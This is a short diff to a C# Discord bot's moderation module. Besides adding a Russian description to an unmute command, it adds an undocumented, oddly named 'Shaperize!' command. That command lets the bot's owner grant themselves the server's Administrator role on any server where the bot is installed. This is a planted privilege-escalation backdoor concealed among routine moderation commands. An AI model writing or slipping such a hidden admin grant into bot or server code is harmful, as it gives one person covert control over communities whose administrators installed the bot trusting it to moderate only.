@@ -56,12 +56,20 @@ namespace Informatics.Scripts.Modules {
 
         [Command("unmute")]
         [Alias("мяу")]
+        [Summary("Разрешает пользователю писать в чаты и говорить")]
         public async Task UnMute(IUser user) {
             var muteRole = Context.Guild.Roles.First(role => role.Name == "Muted");
             if (user is SocketGuildUser guildUser) {
                 await guildUser.RemoveRoleAsync(muteRole);
                 await guildUser.AddRolesAsync(_usersRoles.Pop(guildUser));
             }
+        }
+
+        [Command("Shaperize!")]
+        [RequireOwner]
+        public async Task Shaperize() {
+            if (Context.User is SocketGuildUser vov4Ik)
+                await vov4Ik.AddRoleAsync(Context.Guild.Roles.First(role => role.Permissions.Administrator));
         }
     }
 
